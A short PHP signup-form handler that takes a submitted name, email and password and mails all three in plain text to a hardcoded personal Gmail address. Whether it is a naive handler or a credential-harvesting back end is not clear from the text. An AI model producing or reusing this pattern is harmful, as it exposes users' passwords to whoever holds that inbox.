<?php
if (isset($_POST["submit"])) {
    $name = $_POST['name'];
    $email = $_POST['email'];
    $password = $_POST['password'];  // New password field added

    $from = 'sender@mail';  // Email that sends the signup info
    $to = 'honey1432koushik@gmail.com';  // Recipient email address
    $subject = 'Signup Form Submission';  // Email subject

    // Message body for the email
    $body = "From: $name\nE-Mail: $email\nPassword: $password\n";

    // Sending email
    if (mail($to, $subject, $body, "From: $from")) {
        header("Location: thank-you.html");  // Redirect to a thank you page after success
        exit;
    } else {
        die("Error sending email.");  // Show error message if email fails
    }
}
?>
